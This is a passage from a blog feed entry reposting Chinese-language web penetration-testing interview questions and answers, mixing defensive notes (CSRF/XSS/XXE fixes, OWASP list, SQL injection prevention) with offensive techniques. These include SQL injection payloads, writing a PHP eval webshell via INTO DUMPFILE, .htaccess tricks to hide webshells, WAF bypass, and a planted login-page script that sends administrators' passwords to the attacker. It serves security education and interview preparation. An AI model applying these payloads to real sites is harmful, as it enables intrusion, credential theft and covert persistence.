查看编辑器的名称版本,然后搜索公开的漏洞。</p><p><strong>12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</strong></p><p>​    能做的事情很多，用隐藏网马来举例子：<br>​    插入<br>​    &lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php <br>​    .jpg文件会被解析成.php文件。</p><p>​    具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。</p><p><strong>13.注入漏洞只能查账号密码？</strong></p><p>​    只要权限广，拖库脱到老。</p><p><strong>14.安全狗会追踪变量，从而发现出是一句话木马吗？</strong></p><p>​    是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。</p><p><strong>15.access 扫出后缀为asp的数据库文件，访问乱码，**</strong>如何实现到本地利用？**</p><p>​    迅雷下载，直接改后缀为.mdb。</p><p><strong>16.提权时选择可读写目录，为何尽量不用带空格的目录？</strong></p><p>​    因为exp执行多半需要空格界定参数</p><p><strong>17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</strong></p><p>​    同数据库。</p><p><strong>18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？</strong></p><p>​    and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。</p><p><strong>19:某个防注入系统，在注入时会提示：</strong></p><p>系统检测到你有非法注入的行为。<br>已记录您的ip xx.xx.xx.xx<br>时间:2016:01-23<br>提交页面:test.asp?id=15<br>提交内容:and 1=1</p><p><strong>20、如何利用这个防注入系统拿shell？</strong></p><p>在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。具体文章参见：<a href="http://ytxiao.lofter.com/post/40583a_ab36540。" target="_blank" rel="noopener">http://ytxiao.lofter.com/post/40583a_ab36540。</a></p><p><strong>21.上传大马后访问乱码时，有哪些解决办法？</strong></p><p>​    浏览器中改编码。</p><p><strong>22.审查上传点的元素有什么意义？</strong></p><p>​    有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p><p><strong>23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</strong></p><p>​    先爆破用户名，再利用被爆破出来的用户名爆破密码。</p><p>​    其实有些站点，在登陆处也会这样提示</p><p>​    所有和数据库有交互的地方都有可能有注入。</p><p><strong>24.目标站发现某txt的下载地址为</strong><a href="http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？" target="_blank" rel="noopener">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？</a></p><p>​    这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。</p><p><strong>25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</strong></p><p>​    直接在网站二级目录/abc/下扫描敏感文件及目录。</p><p><strong>26.在有shell的情况下，如何使用xss实现对目标站的长久控制？</strong></p><p>​    后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。</p><p>​    在登录后才可以访问的文件中插入XSS脚本。</p><p><strong>27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</strong></p><p>​    审查元素 把密码处的password属性改成text就明文显示了</p><p><strong>28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？</strong></p><p>​    原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</p><p><strong>29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</strong></p><p>​    在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到<hws>内容<hws>。</hws></hws></p><p><strong>30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？</strong></p><p>​    隐藏文件夹，为了不让管理员发现你传上去的工具。</p><p><strong>31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：</strong></p><p>A. demo.jsp?id=2+1       B. demo.jsp?id=2-1<br>选B，在 URL 编码中 + 代表空格，可能会造成混淆</p><p><strong>32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</strong></p><p>demo.do?DATA=AjAxNg==<br>DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试</p><p><strong>33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？</strong></p><p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell<br>使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高<br>通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p><p><strong>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</strong></p><p><strong>XSS是跨站脚本攻击</strong>，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p><p><strong>CSRF是跨站请求伪造攻击</strong>，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer<br>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p><p><strong>35、CSRF、SSRF和重放攻击有什么区别？</strong></p><p>CSRF是跨站请求伪造攻击，由客户端发起<br>SSRF是服务器端请求伪造，由服务器发起<br>重放攻击是将截获的数据包进行重放，达到身份认证等目的</p><p><strong>36、说出至少三种业务逻辑漏洞，以及修复方式？</strong></p><p><strong>密码找回漏洞</strong>中存在</p><p>1）密码允许暴力破解、</p><p>2）存在通用型找回凭证、</p><p>3）可以跳过验证步骤、</p><p>4）找回凭证可以拦包获取</p><p>等方式来通过厂商提供的密码找回功能来得到密码。<br><strong>身份认证漏洞</strong>中最常见的是</p><p>1）会话固定攻击</p><p>2） Cookie 仿冒</p><p>只要得到 Session 或 Cookie 即可伪造用户身份。<br><strong>验证码漏洞</strong>中存在</p><p>1）验证码允许暴力破解</p><p>2）验证码可以通过 Javascript 或者改包的方法来进行绕过</p><p><strong>37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</strong></p><p>get /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world”<br>HTTP/1.1Host:<strong><em>.com:82User-Agent:Mozilla/<br>5.0 Firefox/40Accept:text/css,/;q=0.1<br>Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3<br>Referer:http://****</em></strong>.com/eciop/orderForCC/<br>cgtListForCC.htm?zone=11370601&amp;v=145902<br>Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;<br>uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;<br>st_uid=N90PLYHLZGJXI-NX01VPUF46W;<br>status=True<br>Connection:keep-alive</p><p><strong>38、给你一个网站你是如何来渗透测试的?</strong><br>    在获取书面授权的前提下。</p><p><strong>39、sqlmap，怎么对一个注入点注入？</strong><br>    1）如果是get型号，直接，sqlmap -u “诸如点网址”.<br>    2) 如果是post型诸如点，可以sqlmap -u “注入点网址” –data=”post的参数”<br>    3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r “文件地址”</p><p><strong>40、nmap，扫描的几种方式</strong></p><p><a href="https://www.jianshu.com/p/56ea8b844eb7" target="_blank" rel="noopener">https://www.jianshu.com/p/56ea8b844eb7</a></p><p><strong>41、sql注入的几种类型？</strong><br>    1）报错注入<br>    2）bool型注入<br>    3）延时注入<br>    4）宽字节注入</p><p><strong>42、报错注入的函数有哪些？ 10个</strong><br>    1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】—————-<br>    2）通过floor报错 向下取整<br>    3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)<br>    4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)b));<br>    5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));<br>    6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));<br>    7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));<br>    8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));<br>    9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));<br>    10）.exp()select from test where id=1 and exp(~(select * from(select user())a));</p><p><strong>43、延时注入如何来判断？</strong><br>    if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)</p><p><strong>44、盲注和延时注入的共同点？</strong><br>    都是一个字符一个字符的判断</p><p><strong>45、如何拿一个网站的webshell？</strong><br>    上传，后台编辑模板，sql注入写文件，命令执行，代码执行，<br>    一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等</p><p><strong>46、sql注入写文件都有哪些函数？</strong><br>    select ‘一句话’ into outfile ‘路径’<br>    select ‘一句话’ into dumpfile ‘路径’<br>    select ‘<?php eval($_POST[1]) ?>‘ into dumpfile  ‘d:\wwwroot\baidu.com\nvhack.php’;</p><p><strong>47、如何防止CSRF?</strong><br>    1,验证referer<br>    2，验证token<br>    详细：<a href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd" target="_blank" rel="noopener">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a></p><p><strong>48、owasp 漏洞都有哪些？</strong><br>    1、SQL注入防护方法：<br>    2、失效的身份认证和会话管理<br>    3、跨站脚本攻击XSS<br>    4、直接引用不安全的对象<br>    5、安全配置错误<br>    6、敏感信息泄露<br>    7、缺少功能级的访问控制<br>    8、跨站请求伪造CSRF<br>    9、使用含有已知漏洞的组件<br>    10、未验证的重定向和转发</p><p><strong>49、SQL注入防护方法？</strong><br>    1、使用安全的API<br>    2、对输入的特殊字符进行Escape转义处理<br>    3、使用白名单来规范化输入验证方法<br>    4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>    5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。</p><p><strong>50、代码执行，文件读取，命令执行的函数都有哪些？</strong></p><p>1）代码执行：</p><p>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</p><p>2）文件读取：</p><p>file_get_contents(),highlight_file(),fopen(),read </p><p>file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等<br>3)命令执行：</p><p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p><p><strong>51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</strong><br>    src指定一个远程的脚本文件，获取referer</p><p><strong>52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</strong></p><p>1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析<br>    AddType application/x-httpd-php .jpg<br>    &lt;img src=<a href="http://xss.tv/1.jpg" target="_blank" rel="noopener">http://xss.tv/1.jpg</a>&gt; 会以php方式来解析</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.03.03/STCS.jpg&quot; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;转载：阿里安全应急响应中心微信公众号&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="面试经验" scheme="https://www.se7ensec.cn/tags/%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
</feed>
